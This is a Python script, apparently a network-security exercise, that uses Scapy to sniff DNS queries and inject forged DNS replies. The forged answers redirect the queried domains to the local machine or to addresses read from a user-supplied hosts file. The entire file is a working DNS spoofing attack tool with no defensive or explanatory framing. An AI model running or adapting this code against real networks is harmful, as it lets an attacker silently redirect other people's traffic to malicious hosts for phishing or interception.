import getopt
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import re
def strip(url):
    if url.startswith('http'):
        url = re.sub(r'https?://', '', url)
    if url.startswith('www.'):
        url = re.sub(r'www.', '', url)
    return url

#print('ARGV      :', sys.argv[1:])
interface = ''
interface_present = False
hostfile = ''
hostfile_present = False
bpf = ''
opt_index = 0
host = {}
myip='192.168.10.135'
options, remainder = getopt.getopt(sys.argv[1:], 'i:h:')
#print('OPTIONS   :', options)
#print('Remainder: ', remainder)

for rem in remainder:
	bpf = bpf + ' ' + rem
for opt, arg in options:
    if opt in ('-i'):
        interface = arg
        interface_present = True
    elif opt in ('-h'):
        hostfile = arg
        hostfile_present = True
#print('interface   :', interface)
#print('hostfile   :', hostfile)
#print('hostfile_present    :', hostfile_present)
#print('BPF    :', bpf)


def my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 53))
    except socket.error:
        return None
    return s.getsockname()[0]
#https://serverfault.com/questions/690391/finding-local-ip-addresses-using-pythons-stdlib-under-debian-jessie --- how to get ip of the machine I am using



def readFile(hostfile):
	f = open(hostfile, "r")
	for line in f:
		hostline = line.split()
		host[strip(hostline[1])] = hostline[0]
def dns_spoof(pkt):
    redirect_to = '192.168.10.135'
    if (DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0):
        domain = pkt[DNS].qd.qname.decode('ASCII');
        domain=domain[:len(domain)-1]
        domain = strip(domain)
        if(hostfile_present and host.get(domain) == None):
            #print(domain,"not found")
            return
        if(hostfile_present):
            redirect_to = host.get(domain)
            #print(domain, "not found1")
        else:
            redirect_to = myip
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        send(spoofed_pkt)
        print('Sent:', spoofed_pkt.summary())
if hostfile_present:
	readFile(hostfile)
myip = my_ip()
#print(type(interface))
if interface_present:
	sniff(filter=bpf,iface = interface,store=0, prn=dns_spoof)
else:
	sniff(filter=bpf, store=0, prn=dns_spoof)
